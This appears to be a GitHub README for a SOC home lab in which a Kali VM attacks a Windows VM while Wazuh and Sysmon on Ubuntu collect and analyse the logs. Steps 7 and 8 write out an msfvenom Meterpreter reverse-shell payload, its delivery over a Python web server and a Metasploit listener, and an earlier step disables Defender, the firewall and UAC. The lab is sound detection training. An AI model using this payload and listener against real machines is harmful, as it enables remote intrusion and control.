<img align="right" src="https://visitor-badge.laobi.icu/badge?page_id=smileycookie.SOC_Home_Lab" />

<div align="center">
    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/SOC_Home_Lab%20.png">
</div>


## Contents
1. [Introduction](#introduction)
2. [Prerequisites](#prerequisites)
3. [Network Topology & NAT Configuration](#network-topology--nat-configuration)
4. [Step 1: Setting up Virtual Machines (VMs)](#step-1-setting-up-virtual-machines-vms)
   - [1. Configuring NAT Network](#1-configuring-nat-network)
   - [2. Assign NAT Network to VMs](#2-assign-nat-network-to-vms)
   - [3. Setting Up Ubuntu (SIEM Center)](#3-setting-up-ubuntu-siem-center)
   - [4. Setting Up Kali Linux (Attacker VM)](#4-setting-up-kali-linux-attacker-vm)
   - [5. Setting Up Windows 10 (Victim Machine)](#5-setting-up-windows-10-victim-machine)
   - [6. Take Snapshots of VMs (Recommended)](#6-take-snapshots-of-vms-recommended)
5. [Step 2: Additional Setup in Windows VM](#step-2-additional-setup-in-windows-vm)
   - [1. Disable Windows Defender & Firewall](#1-disable-windows-defender--firewall)
   - [2. Disable User Account Control (UAC)](#2-disable-user-account-control-uac)
   - [3. Enable Remote Desktop Protocol (RDP) (Optional)](#3-enable-remote-desktop-protocol-rdp-optional)
   - [4. Modify Group Policy Settings](#4-modify-group-policy-settings)
   - [5. Configure Local Security Policy](#5-configure-local-security-policy)
6. [Step 3: Installing Sysmon on Windows](#step-3-installing-sysmon-on-windows)
7. [Step 4: Verify Sysmon is Running](#step-4-verify-sysmon-is-running)
8. [Step 5: Installing Wazuh on Ubuntu VM](#step-5-installing-wazuh-on-ubuntu-vm)
9. [Step 6: Installing Wazuh Agent on Windows VM](#step-6-installing-wazuh-agent-on-windows-vm)
   - [1. Download the Wazuh Agent for Windows](#1-download-the-wazuh-agent-for-windows)
   - [2. Run the Installation](#2-run-the-installation)
   - [3. Configure Wazuh to ingest Sysmon logs](#3-configure-wazuh-to-ingest-sysmon-logs)
10. [Step 7: Generating Malware with msfvenom](#step-7-generating-malware-with-msfvenom)
    - [1. Use the following command to generate a payload](#1-use-the-following-command-to-generate-a-payload)
    - [2. Transfer Payload to Windows Victim](#2-transfer-payload-to-windows-victim)
11. [Step 8: Setting up a Metasploit Listener](#step-8-setting-up-a-metasploit-listener)
    - [1. Start Metasploit and configure the listener](#1-start-metasploit-and-configure-the-listener)
    - [2. Execute Payload on Windows Victim](#2-execute-payload-on-windows-victim)
12. [Step 9: Log Verification in Wazuh](#step-9-log-verification-in-wazuh)
13. [Step 10: Attack Detection & Analysis](#step-10-attack-detection--analysis)
    - [1. Review Attack Logs in Wazuh Dashboard](#1-review-attack-logs-in-wazuh-dashboard)
    - [2. Identify Indicators of Compromise (IOCs)](#2-identify-indicators-of-compromise-iocs)
14. [Troubleshooting](#troubleshooting)
15. [Points to Remember](#points-to-remember)
16. [Future Implementation](#future-implementation)
17. [References](#references)

---

## Introduction
This document provides a step-by-step guide to setting up a Security Operations Center (SOC) home lab. The lab consists of three virtual machines (VMs):

- **Kali Linux (Attacker VM)**
- **Ubuntu (SIEM Center)**
- **Windows 10 (Victim Machine)**

The objective of this lab is to simulate real-world security scenarios, analyze attacks, and improve cybersecurity skills.

## Prerequisites

| Category                 | Requirements                                       |
|--------------------------|---------------------------------------------------|
| **Operating Systems**    | - Ubuntu ISO (Latest LTS recommended) <br> - Windows 10 ISO <br> - Kali Linux Pre-built VM |
| **System Requirements**  | - RAM: 8GB or 16GB (Higher is better) <br> - Internet Connectivity: Required for downloads and updates |
| **Logging & Monitoring Tools** | - Wazuh (SIEM & security analytics) <br> - Sysmon (System monitoring & event logging) |

## Network Topology & NAT Configuration

### Diagram:
```
       [Kali (Attacker)]
             ▲
             │
             ▼
  [Windows (Victim)] ←→ [Ubuntu (SIEM)]
```

### Description:
- **Kali (Attacker) → Windows (Victim):** Executes attacks.
- **Windows (Victim) → Ubuntu (SIEM):** Sends logs to Wazuh for analysis.
- **Ubuntu (SIEM) → Kali (Attacker):** Used for monitoring attack behavior.

## Step 1: Setting up Virtual Machines (VMs)
### 1. Configuring NAT Network
- Open VirtualBox and navigate to **File → Preferences → Network**.
- Go to the **NAT Networks** tab and click **Add**.
- Assign a name (e.g., **SOC_NAT**) and configure the settings:
  - **Network CIDR:** 10.0.2.0/24
  - **Enable DHCP:** Checked
  - **Supports Port Forwarding:** Checked
- Click **OK** to save.

<div align="center">
<!--   <h1>My Project</h1> -->
    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/1.png" >
    <p><em>Figure.1: NAT Network Configuration.</em></p>
</div>

### 2. Assign NAT Network to VMs
- For each VM (**Ubuntu, Kali, Windows**):
  - Open **Settings → Network**.
  - Set **Adapter 1** to **NAT Network** and select **SOC_NAT**.
  - Set **Adapter 2** (if needed) to **Host-Only** for internal communication.

### 3. Setting Up Ubuntu (SIEM Center)
- Download the latest **Ubuntu LTS ISO** from the official Ubuntu website.
- Create a new VM in **VirtualBox** or **VMware**:
  - **RAM**: Allocate at least **2GB** (**4GB recommended**).
  - **Storage**: Assign **20GB or more**.
  - **Network Adapter**: Set to **Bridged** or **Host-Only**, depending on lab requirements.
- Attach the downloaded **Ubuntu ISO** and start the VM.
- Follow the installation steps:
  - Choose **Normal Installation** and enable updates.
  - Create a **user account** and set a **strong password**.
  - Complete installation and restart the VM.
- Update the system:
  ```bash
  sudo apt update && sudo apt upgrade -y
  ```

### 4. Setting Up Kali Linux (Attacker VM)
- Download the **Kali Linux Pre-built VM** from Kali's official website.
- Import the **OVA file** into **VirtualBox** or **VMware**.
- Configure system resources:
  - **RAM**: At least **2GB** (**4GB recommended**).
  - **Storage**: Minimum **20GB**.
- Start the VM and update Kali Linux:
  ```bash
  sudo apt update && sudo apt upgrade -y
  ```

### 5. Setting Up Windows 10 (Victim Machine)
- Download the **Windows 10 ISO** from Microsoft's website.
- Create a new VM in **VirtualBox** or **VMware**:
  - **RAM**: Allocate at least **4GB** (**8GB recommended**).
  - **Storage**: Assign **40GB or more**.
  - **Network Adapter**: Set to **Bridged** or **Host-Only**.
- Attach the **Windows 10 ISO** and start the VM.
- Follow the installation steps:
  - Select the appropriate **region, language, and edition**.
  - Complete the installation and create a **user account**.
  - **Disable Windows Updates** (for lab stability) and install necessary tools.

### 6. Take Snapshots of VMs (Recommended)
- After setting up each VM, take a snapshot to restore a clean state when needed.
- **VirtualBox**: Go to **Machine → Take Snapshot**.
- **VMware**: Navigate to **VM → Snapshot → Take Snapshot**.

<div align="center">
<!--   <h1>My Project</h1> -->
    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/2.png" >
    <p><em>Figure.2: Figure.: Taking Snapshot of VMs.</em></p>
</div>

### Step 2: Additional Setup in Windows VM
#### 1. Disable Windows Defender & Firewall
- Open **Windows Security → Virus & Threat Protection**.
- Click on **Manage Settings** and turn off **Real-time Protection**.
- Open **Control Panel → Windows Defender Firewall**.
- Click **Turn Windows Defender Firewall on or off**.
- Select **Turn off Windows Defender Firewall** for both private and public networks.

<div align="center">
<!--   <h1>My Project</h1> -->
    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/3.png" >
    <p><em>Figure.3: Turn off Real-time protection. </em></p>
</div>

<div align="center">
<!--   <h1>My Project</h1> -->
    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/4.png" >
    <p><em>Figure.4: Turn off Windows Defender Firewall</em></p>
</div>

#### 2. Disable User Account Control (UAC)
- Open **Control Panel → User Accounts → Change User Account Control Settings**.
- Drag the slider down to **Never Notify** and click **OK**.
- Restart the system for changes to take effect.

#### 3. Enable Remote Desktop Protocol (RDP) (Optional)
- Open **Settings → System → Remote Desktop**.
- Toggle **Enable Remote Desktop** to **On**.
- Click **Advanced settings** and allow connections.

#### 4. Modify Group Policy Settings
- Open **Run (Win + R)** → Type **gpedit.msc** and press **Enter**.
- Navigate to **Computer Configuration → Administrative Templates → Windows Components → Windows Update**.
- Double-click **Configure Automatic Updates**, select **Disabled** and click **OK**.

#### 5. Configure Local Security Policy
- Open **Run (Win + R)** → Type **secpol.msc** and press **Enter**.
- Navigate to **Local Policies → Audit Policy**.
- Enable auditing for **Logon Events, Object Access, and Process Tracking**.
- Apply changes and restart the system.


### Step 3: Installing Sysmon on Windows
1. Download **Sysmon** from **Microsoft Sysinternals**.
2. Install Sysmon with the configuration file:
```bash
sysmon -accepteula -i sysconfig-export.xml
```
4. Verify Sysmon logs in **Event Viewer**:
   - Open **Event Viewer (eventvwr.msc)**.
   - Navigate to **Applications and Services Logs → Microsoft → Windows → Sysmon → Operational**.

<div align="center">
<!--   <h1>My Project</h1> -->
    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/5.png" >
    <p><em>Figure.5: Installation of Sysmon.</em></p>
</div>

## Step 4: Verify Sysmon is Running
Run the following command:
```bash
sysmon -c
```
- If Sysmon is working, it will display the current configuration.

<div align="center">
<!--   <h1>My Project</h1> -->
    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/6.png" >
    <p><em>Figure.6: Verification of Sysmon installation</em></p>
</div>

### Check Event Viewer
1. Open Run (**Win + R**)
2. Type `eventvwr.msc` and press **Enter**
3. Navigate to **Applications and Services Logs → Microsoft → Windows → Sysmon → Operational**
4. If you see logs, Sysmon is working!

<div align="center">
<!--   <h1>My Project</h1> -->
    <img src="[https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/Pic_7_%20Verification%20of%20Sysmon%20Running%20in%20Event%20Viewer.png](https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/7.png)" >
    <p><em>Figure.7: Verification of Sysmon Running in Event Viewer</em></p>
</div>

## Step 5: Installing Wazuh on Ubuntu VM
### Download and Run the Wazuh Quick Start Script
```bash
curl -sO https://packages.wazuh.com/4.x/wazuh-install.sh
sudo bash wazuh-install.sh --quickstart
```

<div align="center">
<!--   <h1>My Project</h1> -->
    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/8.png" >
    <p><em>Figure.8: Installation of Wazuh Dashboard</em></p>
</div


### Wait for the Installation to Complete
- This script installs Wazuh Manager, Dashboard, and Filebeat.
- It will also set up Elasticsearch for log storage and Kibana for visualization.

### Verify Wazuh Services Are Running:
```bash
sudo systemctl status wazuh-manager
sudo systemctl status filebeat
sudo systemctl status kibana
```

## Step 6: Installing Wazuh Agent on Windows VM
### 1. Download the Wazuh Agent for Windows
- Get it from: [Wazuh Agent Download](https://packages.wazuh.com/4.x/windows/wazuh-agent.msi)
- Transfer the `.msi` file to your Windows VM.


<div align="center">
<!--   <h1>My Project</h1> -->
    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/9.png" >
    <p><em>Figure.9:Wazuh Agent configuration</em></p>
</div


### 2. Run the Installation
- Open the installer and follow the steps.
- During installation, set the Wazuh Manager IP to your Ubuntu VM's IP (use `ip a` to check).


<div align="center">
<!--   <h1>My Project</h1> -->
    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/10.png" >
    <p><em>Figure.10:Generating payload</em></p>
</div

              
### 3. Configure Wazuh to ingest Sysmon logs
Edit the Wazuh agent configuration file:
#### Path: `C:\Program Files (x86)\ossec-agent\ossec.conf`
```xml
<localfile>
    <log_format>eventchannel</log_format>
    <location>Microsoft-Windows-Sysmon/Operational</location>
</localfile>
```

#### Restart the Wazuh agent:
```powershell
net stop wazuh-agent
net start wazuh-agent
```

## Step 7: Generating Malware with msfvenom
### 1. Use the following command to generate a payload:
Use the following command to generate a payload:
```bash
msfvenom -p windowsx64/meterpreter/reverse_tcp LHOST=10.0.2.14 LPORT=4444 -f exe > shell.exe
```

<div align="center">
<!--   <h1>My Project</h1> -->
    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/11.png" >
    <p><em>Figure.11:Creating Python server in Terminal</em></p>
</div


### 2. Transfer Payload to Windows Victim
Start a simple Python HTTP server in the same directory as `shell.exe`:
```bash
python3 -m http.server 8080
```
<div align="center">
<!--   <h1>My Project</h1> -->
    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/12.png" >
    <p><em>Figure.12:Downloading the shell.exe (Payload) form the Python server</em></p>
</div


- Open a browser and enter the address: `10.0.2.14:8080`
- Confirm that `shell.exe` is downloaded in the `C:\Users\Public\` folder.


## Step 8: Setting up a Metasploit Listener

### 1. Start Metasploit and configure the listener:
```bash
msfconsole
use exploit/multi/handler
set payload windowsx64/meterpreter/reverse_tcp
set LHOST 10.0.2.14
set LPORT 4444
exploit
```
<div align="center">
<!--   <h1>My Project</h1> -->
    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/13.png" >
    <p><em>Figure.13:Setting up the Metasploit Listener (listener is now waiting for a connection)</em></p>
</div


### 2. Execute Payload on Windows Victim
- On the Windows (Victim VM), run the payload:
```powershell
C:\Users\Public\shell.exe
```
- If successful, a Meterpreter session will open in Metasploit.

<div align="center">
<!--   <h1>My Project</h1> -->
    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/14.png" >
    <p><em>Figure.14:Creation of Reverse Bind Shell</em></p>
</div>


<div align="center">
<!--   <h1>My Project</h1> -->
    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/15.png" >
    <p><em>Figure.15:Confirmation of Execution of Payload (shell.exe)</em></p>
</div>

## Step 9: Log Verification in Wazuh
- Open the **Wazuh Dashboard (Kibana)**.
- Navigate to **Discover** and filter logs using:
  ```
  data.win.system.providerName: "Microsoft-Windows-Sysmon"
  ```
- Check if logs show process creation and network connections.

<div align="center">
<!--   <h1>My Project</h1> -->
    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/16.png" >
    <p><em>Figure.16: Sysmon Log ingestion in Wazuh dashboard is working.</em></p>
</div>


## Step 10: Attack Detection & Analysis
### 1. Review Attack Logs in Wazuh Dashboard
 - Open the Wazuh Dashboard in your browser.
 - Navigate to **Security Events** or **Alerts**.
 - Use the search/filter function to look for logs using the following table view with keys:

  ```plaintext
  agent.ip
  rule.id
  data.win.eventdata.LogonGuid
  data.win.eventdata.Commandline
  ```

<div align="center">
<!--   <h1>My Project</h1> -->
    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/17.png" >
    <p><em>Figure.17:Telemetry Analysis 1.</em></p>
</div>

<div align="center">
<!--   <h1>My Project</h1> -->
    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/18.png" >
    <p><em>Figure.18:Telemetry Analysis 2.</em></p>
</div>



### 2. Identify Indicators of Compromise (IOCs)
<div align="center">
<!--   <h1>My Project</h1> -->
    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/19.png" >
    <p><em>Figure.19: Process Creation (Event ID 1).</em></p>
</div>

<div align="center">
<!--   <h1>My Project</h1> -->
    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/20.png" >
    <p><em>Figure.20: File Drops (Event ID 11).</em></p>
</div>

<div align="center">
<!--   <h1>My Project</h1> -->
    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/21.png" >
    <p><em>Figure.21:  Rule.description: Executable file dropped in folder commonly used by malware.</em></p>
</div>


## Troubleshooting
- Ensure all VMs are configured with the correct network settings to avoid connectivity issues.
- Keep your system resources in check; allocate sufficient RAM and CPU to VMs for smooth performance.
- Regularly update Kali Linux, Ubuntu, and Windows to ensure you have the latest security patches.
- Take frequent snapshots before performing any major changes to avoid data loss.
- If Wazuh logs are not appearing, verify that the agent is running properly and Sysmon is configured correctly.
- When using Metasploit, ensure the correct payload and LHOST/LPORT settings are used to avoid failed exploits.

## Points to Remember
- Always take snapshots before executing attacks.
- Isolate the victim machine from the internet to prevent real-world damage.
- Analyze logs carefully to detect security threats.
- Hands-on experience in malware analysis and attack simulations.
- Familiarity with Sysmon, Wazuh, and Metasploit.

## Future Implementation
- **Integration of Threat Intelligence Frameworks**: Implement MISP or OpenCTI to enrich alerts with contextual intelligence.
- **Integration of TheHive Project**: Use TheHive for case management and investigation workflows.
- **Automation**: Implement security automation using Cortex or SOAR solutions for faster response to threats.

## References
- **Home Lab Video**: YouTube Link: https://youtu.be/-8X7Ay4YCoA?si=yAr2qS22xM8av5fF
- **Blog Guide**: Simply Cyber Blog : https://www.simplycyber.io/post/uncover-the-secrets-of-a-home-soc-analyst-lab-step-by-step-walkthrough

I have attached the link to the log report for reference.
Logs Link: https://github.com/smileycookie/SOC_Home_Lab/tree/main/Logs
